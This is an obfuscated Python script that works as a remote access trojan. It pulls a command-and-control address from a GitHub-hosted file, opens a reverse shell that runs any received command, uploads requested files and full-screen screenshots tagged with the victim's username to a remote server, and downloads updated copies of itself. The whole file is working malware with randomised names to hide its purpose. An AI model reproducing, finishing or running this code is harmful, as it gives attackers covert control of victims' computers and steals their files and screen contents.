import subprocess,socket,time,requests,os
from PIL import ImageGrab
XbYvFQIAwzMv = "05.12.24.0"
YEKDwXtIoVgPZien = ""
VEcwsOhKPHzVCNriYo = ""
atYzxZSecDz = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
foLHFxvPQAIbvVXKSAXZBLH = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
EoWlkPvEBCsdQT = "!"
def VpbXVZhLRpOaFO(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def FcdKHlWsMvpTmw(s):
	DZLFhRwYLzToTNvOKyEWY = s.recv(1024)
	if len(DZLFhRwYLzToTNvOKyEWY)==0:
		return True
	aBebVwlJllYOSQIdcw = DZLFhRwYLzToTNvOKyEWY.decode("utf-8").replace("\n","")
	if not aBebVwlJllYOSQIdcw.startswith(EoWlkPvEBCsdQT):
		proc = subprocess.run(aBebVwlJllYOSQIdcw, shell=True, capture_output=True)
		bnnrsXDivUegqestX = proc.stdout + proc.stderr
		s.send(bnnrsXDivUegqestX)
		return
	cxrOfESHrVkrnsuuIDTjaEx = aBebVwlJllYOSQIdcw.split(" ")[0][1:]
	if cxrOfESHrVkrnsuuIDTjaEx == "download":
		FyRZqlzPUgbvIoAHvpOy(s, aBebVwlJllYOSQIdcw)
	elif cxrOfESHrVkrnsuuIDTjaEx == "screenshot":
		vLmMwZLIPhIYcKHrrK(s)
def FyRZqlzPUgbvIoAHvpOy(s, aBebVwlJllYOSQIdcw):
	FyeGqleNgZKN = aBebVwlJllYOSQIdcw.replace(EoWlkPvEBCsdQT+"download ","").split(",")
	bnnrsXDivUegqestXs = ""
	for f in FyeGqleNgZKN:
		bnnrsXDivUegqestXs += IMHmGjwhaSBeTVrOBoeaM(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(bnnrsXDivUegqestXs, "utf-8"))
def vLmMwZLIPhIYcKHrrK(s):
	jkYSnqp = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	iByYYozQdDhW = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	jkYSnqp.save(iByYYozQdDhW)
	jkYSnqp.close()
	r = IMHmGjwhaSBeTVrOBoeaM(iByYYozQdDhW, "api/sscap")
	os.remove(iByYYozQdDhW)
	s.send(bytes(r,"utf-8"))
def IMHmGjwhaSBeTVrOBoeaM(owoDaDWbJpOPmkZHQefxr, EyOriMo, SZJuQkvs=None):
	if not os.path.exists(owoDaDWbJpOPmkZHQefxr):
		return "[!] NOT FOUND: "+owoDaDWbJpOPmkZHQefxr+"\n"
	headers = {"user":os.getlogin()}
	if SZJuQkvs is not None:
		headers = {**headers, **SZJuQkvs}
	requests.post("http://"+YEKDwXtIoVgPZien+":5555/"+EyOriMo,
		files={"file":open(owoDaDWbJpOPmkZHQefxr, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+owoDaDWbJpOPmkZHQefxr+"\n"
def TrvQbyPlmidifVJ():
	global YEKDwXtIoVgPZien, VEcwsOhKPHzVCNriYo
	if YEKDwXtIoVgPZien == "" or VEcwsOhKPHzVCNriYo == "":
		DZLFhRwYLzToTNvOKyEWY = requests.get(atYzxZSecDz).text.replace("\n","").split(":")
		YEKDwXtIoVgPZien = DZLFhRwYLzToTNvOKyEWY[0].strip()
		VEcwsOhKPHzVCNriYo = DZLFhRwYLzToTNvOKyEWY[1].strip()
		jSvGGcTCaCNiIu = DZLFhRwYLzToTNvOKyEWY[2].strip()
	return YEKDwXtIoVgPZien, VEcwsOhKPHzVCNriYo, jSvGGcTCaCNiIu
def zYUHwocyaxHnFN():
	UoZDyZyGNUWgRzy = os.path.basename(__file__)
	fileType = UoZDyZyGNUWgRzy.split(".")[-1]
	ykdeZABJ = UoZDyZyGNUWgRzy.replace("."+fileType,"") +"."+XbYvFQIAwzMv + "."+fileType
	HBsuiNYWRrUQKyzG = os.path.join(os.getcwd(), ykdeZABJ)
	with open(ykdeZABJ, "w+") as f:
		f.write(requests.get(foLHFxvPQAIbvVXKSAXZBLH+"file."+HBsuiNYWRrUQKyzG.split(".")[-1]).text)
	#if fileType == "exe":
	#	os.system(".\"+HBsuiNYWRrUQKyzG")
	#elif fileType.startswith("py"):
	#	os.system("python "+HBsuiNYWRrUQKyzG)
def APTzpQSGXm():
	pass
def ozgGzfGPANPQyiWSnCU():
	h, p, v = TrvQbyPlmidifVJ()
	if XbYvFQIAwzMv != v:
		zYUHwocyaxHnFN()
	APTzpQSGXm()
	APpHCTcbCjmAA = bytes("["+XbYvFQIAwzMv+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				qdWcYrxaJmfKkDIZXYB=False
				try:
					s=VpbXVZhLRpOaFO(h, p)
					while not qdWcYrxaJmfKkDIZXYB:
						s.send(APpHCTcbCjmAA)
						qdWcYrxaJmfKkDIZXYB=FcdKHlWsMvpTmw(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
ozgGzfGPANPQyiWSnCU()
